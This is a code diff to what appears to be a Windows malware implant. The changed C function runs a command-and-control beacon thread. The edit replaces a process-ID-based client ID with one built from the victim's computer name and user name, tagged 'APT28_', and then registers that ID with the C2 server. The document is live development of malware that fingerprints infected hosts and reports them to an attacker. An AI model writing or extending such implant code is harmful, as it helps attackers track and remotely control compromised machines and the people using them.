@@ -385,11 +385,25 @@ int get_random_interval() {
 // Main C2 communication loop (runs in separate thread)
 DWORD WINAPI c2_communication_thread(LPVOID arg) {
     (void)arg;  // Unused parameter
-    char client_id[64];
+    char client_id[128];
     CommandWithArgs cmd;
     
-    // Generate unique client ID
-    snprintf(client_id, sizeof(client_id), "APT28_%lu_%lld", (unsigned long)GetCurrentProcessId(), (long long)time(NULL));
+    // Get computer name
+    CHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD compSize = MAX_COMPUTERNAME_LENGTH + 1;
+    if (!GetComputerNameA(computerName, &compSize)) {
+        strcpy(computerName, "UNKNOWN");
+    }
+    
+    // Get username
+    CHAR userName[257];  // UNLEN (256) + 1
+    DWORD userSize = 257;
+    if (!GetUserNameA(userName, &userSize)) {
+        strcpy(userName, "UNKNOWN");
+    }
+    
+    // Generate unique client ID using computer name and username
+    snprintf(client_id, sizeof(client_id), "APT28_%s_%s", computerName, userName);
     
     // Register with C2 server
     register_with_c2(client_id);
